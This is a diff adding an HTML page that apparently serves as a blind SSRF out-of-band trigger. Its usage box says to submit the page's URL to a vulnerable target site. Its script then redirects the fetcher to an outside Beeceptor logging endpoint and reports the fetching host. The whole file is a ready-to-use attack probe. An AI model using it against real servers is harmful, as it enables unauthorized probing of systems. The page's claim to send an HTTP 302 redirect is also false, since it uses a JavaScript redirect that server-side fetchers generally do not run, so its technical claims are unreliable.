@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Dynamic Blind SSRF OOB Trigger</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 30px; background-color: #e3f2fd; color: #333; }
+        .container { background-color: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); }
+        h1 { color: #1e88e5; }
+        .note { padding: 10px; margin-top: 15px; background-color: #bbdefb; border-left: 5px solid #1e88e5; }
+        #redirect-url-display { font-weight: bold; color: #d32f2f; }
+        #status { font-weight: bold; margin-top: 10px; color: #FF9800; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Blind SSRF Out-of-Band (OOB) Proof of Concept</h1>
+        <p><strong>Origin:</strong> This page is designed to be fetched by the **target server**.</p>
+
+        <div class="note">
+            <strong>Usage:</strong>
+            1. Get your unique Beeceptor endpoint (e.g., <code>https://ssrf-log.beeceptor.com</code>).
+            2. Craft the SSRF payload on the **vulnerable target site** by submitting this URL:
+            <br><br>
+            <code>https://yourusername.github.io/ssrf_trigger.html?log=YOUR_BEECEPTOR_ENDPOINT</code>
+        </div>
+
+        <p id="status">Status: Preparing HTTP 302 Redirect Payload...</p>
+        <p>The server should immediately be redirected to: <code id="redirect-url-display">N/A</code></p>
+        
+        <p>If you see a request hit your **Beeceptor log**, it confirms the target server is vulnerable to Blind SSRF and allows external connections.</p>
+    </div>
+
+    <script>
+        // Use JavaScript to perform a quick redirect, simulating a server-side redirect
+        function runSsrfTrigger() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const logEndpoint = urlParams.get('log');
+            
+            if (!logEndpoint) {
+                document.getElementById('status').textContent = "ERROR: No 'log' parameter found. Cannot redirect.";
+                return;
+            }
+
+            // Append a unique path to the log URL for clear identification in Beeceptor
+            const finalRedirectUrl = `${logEndpoint}/ssrf-oob-test?from=${encodeURIComponent(window.location.host)}`;
+            
+            document.getElementById('redirect-url-display').textContent = finalRedirectUrl;
+            document.getElementById('status').textContent = "REDIRECTING... Check your Beeceptor log NOW!";
+
+            // The key mechanism: redirect the fetching client (the target server) to the Beeceptor URL
+            // This works because most server-side URL fetching libraries follow redirects.
+            window.location.replace(finalRedirectUrl);
+        }
+
+        // Run the script
+        runSsrfTrigger();
+    </script>
+</body>
+</html>
